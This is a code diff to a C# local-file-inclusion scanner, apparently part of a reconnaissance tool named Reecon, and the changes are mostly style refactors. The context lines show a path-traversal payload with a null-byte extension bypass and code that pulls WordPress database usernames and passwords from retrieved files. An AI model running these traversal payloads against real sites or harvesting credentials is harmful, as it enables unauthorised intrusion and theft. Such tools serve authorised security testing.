@@ -8,15 +8,13 @@ namespace Reecon
 {
     class LFI
     {
-        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
-        // private static WebClient wc = new();
         private static string baseURL = "";
         private static string baseLocation = "";
         private static int notFoundLength = 0;
         private static int notFoundLength2 = 0;
         private static int notFoundLength3 = 0;
         private static int bypassMethod = -1;
-        private static string cookie = null;
+        private static string? cookie = null;
 
         public static void Scan(string[] args)
         {
@@ -185,8 +183,8 @@ namespace Reecon
             }
 
             // Split the URL - Can't just split since the location could contain an =
-            baseURL = path.Substring(0, path.IndexOf("=") + 1);
-            baseLocation = path.Remove(0, path.IndexOf("=") + 1);
+            baseURL = path.Substring(0, path.IndexOf('=') + 1);
+            baseLocation = path.Remove(0, path.IndexOf('=') + 1);
 
             // Run checks to determine what an invalid path returns
             Console.WriteLine("Determining invalid path results...");
@@ -362,7 +360,7 @@ namespace Reecon
                 }
                 if (bypassMethod == -1 || bypassMethod == 3)
                 {
-                    string ext = baseLocation.Remove(0, baseLocation.IndexOf(".") + 1);
+                    string ext = baseLocation.Remove(0, baseLocation.IndexOf('.') + 1);
                     string toCheck = baseURL + "/../../../../.." + check + $"%00.{ext}";
                     int bypassLength = "/../../../../..".Length + "%00.".Length + ext.Length;
                     bool isLFI = TestLFI(toCheck, check, bypassLength);
@@ -520,12 +518,12 @@ namespace Reecon
                 if (pageText.Contains("DB_USER'") && pageText.Contains("DB_PASSWORD'"))
                 {
                     string userText = pageText.Remove(0, pageText.IndexOf("DB_USER'") + 8);
-                    userText = userText.Remove(0, (userText.IndexOf("'") + 1));
+                    userText = userText.Remove(0, (userText.IndexOf('\'') + 1));
                     userText = userText.Substring(0, userText.IndexOf("' );"));
                     Console.WriteLine("----> Wordpress Database Username: " + userText);
 
                     string passText = pageText.Remove(0, pageText.IndexOf("DB_PASSWORD'") + 12);
-                    passText = passText.Remove(0, (passText.IndexOf("'") + 1));
+                    passText = passText.Remove(0, passText.IndexOf('\'') + 1);
                     passText = passText.Substring(0, passText.IndexOf("' );"));
                     Console.WriteLine("----> Wordpress Database Password: " + passText);
                 }
